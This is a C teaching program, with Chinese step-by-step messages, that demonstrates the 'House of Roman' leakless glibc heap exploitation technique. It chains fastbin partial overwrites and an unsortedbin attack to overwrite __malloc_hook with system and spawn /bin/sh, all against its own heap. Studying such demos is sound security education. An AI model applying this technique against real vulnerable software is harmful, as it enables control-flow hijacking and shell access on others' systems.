#define _GNU_SOURCE     /* for RTLD_NEXT */
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <malloc.h>
#include <dlfcn.h>

char* shell = "/bin/sh\x00";

void* init(){
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}

int main(){

    char* introduction = "\n欢迎学习 House of Roman\n\n"
                 "这是一种无泄漏的堆利用技术\n"
                 "攻击分为三个阶段: \n\n"
                 "1. 通过低位地址改写使 fastbin chunk 的 fd 指针指向 __malloc_hook.\n"
                 "2. 通过 unsortedbin attack 把 main_arena 写到 malloc_hook 上.\n"
                 "3. 通过低位地址修改 __malloc_hook 为 one_gadget.\n\n";
    puts(introduction); 
    init();

    puts("第一步: 让 fastbin chunk 的 fd 指针指向 __malloc_hook\n\n");
    puts("总共申请了 4 个 chunk，分别称为 chunk1、2、3、4，我感觉 chunk123 比一串英文更好记 Orz\n注意我们去 malloc 的时候指针所指向的类型是 uint8_t，实际上就是 char，一个字节\n");
    uint8_t* chunk1 = malloc(0x60); //chunk1
    malloc(0x80); //chunk2
    uint8_t* chunk3 = malloc(0x80); //chunk3
    uint8_t* chunk4 = malloc(0x60); //chunk4
    
    puts("free 掉 chunk3，会被放进 unsorted bin 中，在他的 fd、bk 将变为 unsorted bin 的地址");
    free(chunk3);

    puts("这时候去 malloc 一个（chunk3_1），会从 unsorted bin 中分割出来，同时我们也拿到了 unsorted bin 的地址\n");
    uint8_t* chunk3_1 = malloc(0x60); 
    puts("通过 unsorted bin 的地址计算出 __malloc_hook\n");
    long long __malloc_hook = ((long*)chunk3_1)[0] - 0xe8;

    free(chunk4); 
    free(chunk1);
    puts("依次释放掉 chunk4、chunk1，后进先出，这时候 fastbin 链表是：fastbin 0x70 -> chunk1 -> chunk4\n");
    puts("如果改掉 chunk1 的 fd 指针最后一个字节为 0，这个链表将会变为：fastbin 0x70 -> chunk1 -> chunk3_1 -> chunk3_1 的 fd\n");
    chunk1[0] = 0x00;
    
    puts("chunk3_1 的 fd 是我们可以修改掉的，通过修改后几位，将其改为 __malloc_hook - 0x23\n");
    long long __malloc_hook_adjust = __malloc_hook - 0x23; 

    int8_t byte1 = (__malloc_hook_adjust) & 0xff;   
    int8_t byte2 = (__malloc_hook_adjust & 0xff00) >> 8; 
    chunk3_1[0] = byte1;
    chunk3_1[1] = byte2;

    puts("接下来连续 malloc 两次，把 fastbin 中的 chunk malloc　回去，再次 malloc 就能拿到一个指向 __malloc_hook 附近的 chunk（）\n");
    malloc(0x60);
    malloc(0x60);
    uint8_t* malloc_hook_chunk = malloc(0x60);  
    puts("在真正的漏洞利用中，由于 malloc_hook 的最后半字节是随机的，因此失败了15/16次\n"); 

    puts("第二步：Unsorted_bin attack，使我们能够将较大的值写入任意位置。 这个较大的值为 main_arena + 0x68。 我们通过 unsorted bin attack 把 __malloc_hook 写为 unsortedbin 的地址，这样只需要改低几个字节就可以把 __malloc_hook 改为 system 的地址了。\n");

    uint8_t* chunk5 = malloc(0x80);   
    malloc(0x30); // 防止合并

    puts("把 chunk 放到 unsorted_bin\n");
    free(chunk5);

    __malloc_hook_adjust = __malloc_hook - 0x10; 
    byte1 = (__malloc_hook_adjust) & 0xff;  
    byte2 = (__malloc_hook_adjust & 0xff00) >> 8; 

    puts("覆盖块的最后两个字节使得 bk 为 __malloc_hook-0x10\n");
    chunk5[8] = byte1;
    chunk5[9] = byte2;

    puts("触发 unsorted bin attack\n");
    malloc(0x80); 

    long long system_addr = (long long)dlsym(RTLD_NEXT, "system");
    //这个 dlsym 是用来获得 system 地址的
    puts("第三步：将 __malloc_hook 设置为 system/one_gadget\n\n");
    puts("现在，__malloc_hook 的值是 unsortedbin 的地址，只需要把后几位改掉就行了\n");
    malloc_hook_chunk[19] = system_addr & 0xff;
    malloc_hook_chunk[20] = (system_addr >> 8) & 0xff;
    malloc_hook_chunk[21] = (system_addr >> 16) & 0xff;
    malloc_hook_chunk[22] = (system_addr >> 24) & 0xff; 
    puts("拿到 Shell!");
    malloc((long long)shell);
}